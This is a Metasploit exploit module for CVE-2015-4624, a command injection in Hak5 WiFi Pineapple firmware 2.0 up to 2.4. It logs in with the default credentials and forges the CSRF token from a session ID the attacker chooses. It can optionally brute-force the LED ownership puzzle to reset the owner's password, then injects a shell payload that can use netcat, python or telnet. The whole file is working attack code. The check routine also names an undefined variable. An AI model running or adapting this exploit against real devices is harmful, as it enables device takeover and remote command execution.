# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Hak5 WiFi Pineapple Preconfiguration Command Injection&#039;,
      &#039;Description&#039;    => %q{
      This module exploits a command injection vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.
      We use a combination of default credentials with a weakness in the anti-csrf generation to achieve
      command injection on fresh pineapple devices prior to configuration. Additionally if default credentials fail,
      you can enable a brute force solver for the proof-of-ownership challenge. This will reset the password to a
      known password if successful and may interrupt the user experience. These devices may typically be identified
      by their SSID beacons of &#039;Pineapple5_....&#039;; details derived from the TospoVirus, a WiFi Pineapple infecting
      worm.
      },
      &#039;Author&#039;         => [&#039;catatonicprime&#039;],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [[ &#039;CVE&#039;, &#039;2015-4624&#039; ]],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        => {
        &#039;Space&#039;        => 2048,
        &#039;DisableNops&#039;  => true,
        &#039;Compat&#039;       => {
          &#039;PayloadType&#039;  => &#039;cmd&#039;,
          &#039;RequiredCmd&#039;  => &#039;generic python netcat telnet&#039;
        }
      },
      &#039;Targets&#039;        => [[ &#039;WiFi Pineapple 2.0.0 - 2.3.0&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 1 2015&#039;
    ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to use for login&#039;, &#039;root&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to use for login&#039;, &#039;pineapplesareyummy&#039; ]),
        OptString.new(&#039;PHPSESSID&#039;, [ true, &#039;PHPSESSID to use for attack&#039;, &#039;tospovirus&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Path to the command injection&#039;, &#039;/components/system/configuration/functions.php&#039; ]),
        Opt::RPORT(1471),
        Opt::RHOST(&#039;172.16.42.1&#039;)
      ]
    )
    register_advanced_options(
      [
        OptBool.new(&#039;BruteForce&#039;, [ false, &#039;When true, attempts to solve LED puzzle after login failure&#039;, false ]),
        OptInt.new(&#039;BruteForceTries&#039;, [ false, &#039;Number of tries to solve LED puzzle, 0 -> infinite&#039;, 0 ])
      ]
    )

    deregister_options(
      &#039;ContextInformationFile&#039;,
      &#039;DOMAIN&#039;,
      &#039;DigestAuthIIS&#039;,
      &#039;EnableContextEncoding&#039;,
      &#039;FingerprintCheck&#039;,
      &#039;HttpClientTimeout&#039;,
      &#039;NTLM::SendLM&#039;,
      &#039;NTLM::SendNTLM&#039;,
      &#039;NTLM::SendSPN&#039;,
      &#039;NTLM::UseLMKey&#039;,
      &#039;NTLM::UseNTLM2_session&#039;,
      &#039;NTLM::UseNTLMv2&#039;,
      &#039;SSL&#039;,
      &#039;SSLVersion&#039;,
      &#039;VERBOSE&#039;,
      &#039;WORKSPACE&#039;,
      &#039;WfsDelay&#039;,
      &#039;Proxies&#039;,
      &#039;VHOST&#039;
    )
  end

  def login_uri
    normalize_uri(&#039;includes&#039;, &#039;api&#039;, &#039;login.php&#039;)
  end

  def brute_uri
    normalize_uri("/?action=verify_pineapple")
  end

  def set_password_uri
    normalize_uri("/?action=set_password")
  end

  def phpsessid
    datastore[&#039;PHPSESSID&#039;]
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def cookie
    "PHPSESSID=#{phpsessid}"
  end

  def csrf_token
    Digest::SHA1.hexdigest datastore[&#039;PHPSESSID&#039;]
  end

  def use_brute
    datastore[&#039;BruteForce&#039;]
  end

  def use_brute_tries
    datastore[&#039;BruteForceTries&#039;]
  end

  def login
    # Create a request to login with the specified credentials.
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => login_uri,
      &#039;vars_post&#039; => {
        &#039;username&#039;   => username,
        &#039;password&#039;   => password,
        &#039;login&#039;      => "" # Merely indicates to the pineapple that we&#039;d like to login.
      },
      &#039;headers&#039;   => {
        &#039;Cookie&#039;     => cookie
      }
    )

    return nil unless res

    return res if res.code == 302 && (res.body !~ /invalid username/)

    return res if res.code == 200 && (res.body =~ /Invalid CSRF/)

    nil
  end

  def cmd_inject(cmd)
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => target_uri.path,
      &#039;cookie&#039;    => cookie,
      &#039;vars_get&#039;  => {
        &#039;execute&#039; => "" # Presence triggers command execution
      },
      &#039;vars_post&#039; => {
        &#039;_csrfToken&#039; => csrf_token,
        &#039;commands&#039;   => cmd
      }
    )

    res
  end

  def brute_force
    print_status(&#039;Beginning brute forcing...&#039;)
    # Attempt to get a new session cookie with an LED puzzle tied to it.
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => brute_uri
    )

    # Confirm the response indicates there is a puzzle to be solved.
    if !res || !(res.code == 200) || res.body !~ /own this pineapple/
      print_status(&#039;Brute forcing not available...&#039;)
      return nil
    end

    cookies = res.get_cookies
    counter = 0
    while use_brute_tries.zero? || counter < use_brute_tries
      print_status("Try #{counter}...") if (counter % 5).zero?
      counter += 1
      res = send_request_cgi(
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => brute_uri,
        &#039;cookie&#039;    => cookies,
        &#039;vars_post&#039; => {
          &#039;green&#039;            => &#039;on&#039;,
          &#039;amber&#039;            => &#039;on&#039;,
          &#039;blue&#039;             => &#039;on&#039;,
          &#039;red&#039;              => &#039;on&#039;,
          &#039;verify_pineapple&#039; => &#039;Continue&#039;
        }
      )

      if res && res.code == 200 && res.body =~ /set_password/
        print_status(&#039;Successfully solved puzzle!&#039;)
        return write_password(cookies)
      end
    end
    print_warning("Failed to brute force puzzle in #{counter} tries...")
    nil
  end

  def write_password(cookies)
    print_status("Attempting to set password to: #{password}")
    res = send_request_cgi(
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => set_password_uri,
      &#039;cookie&#039;     => cookies,
      &#039;vars_post&#039;  => {
        &#039;password&#039;     => password,
        &#039;password2&#039;    => password,
        &#039;eula&#039;         => 1,
        &#039;sw_license&#039;   => 1,
        &#039;set_password&#039; => &#039;Set Password&#039;
      }
    )
    if res && res.code == 200 && res.body =~ /success/
      print_status(&#039;Successfully set password!&#039;)
      return res
    end
    print_warning(&#039;Failed to set password&#039;)

    nil
  end

  def check
    loggedin = login
    unless loggedin
      brutecheck = send_request_cgi(
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => brute_uri
      )
      return Exploit::CheckCode::Safe if !brutecheck || !brutecheck.code == 200 || brutecheck.body !~ /own this pineapple/
      return Exploit::CheckCode::Vulnerable
    end

    cmd_success = cmd_inject("echo")
    return Exploit::CheckCode::Vulnerable if cmd_success && cmdSuccess.code == 200 && cmd_success.body =~ /Executing/

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status(&#039;Logging in with credentials...&#039;)
    loggedin = login
    if !loggedin && use_brute
      brute_force
      loggedin = login
    end
    unless loggedin
      fail_with(Failure::NoAccess, "Failed to login PHPSESSID #{phpsessid} with #{username}:#{password}")
    end

    print_status(&#039;Executing payload...&#039;)
    cmd_inject("#{payload.encoded}")
  end
end

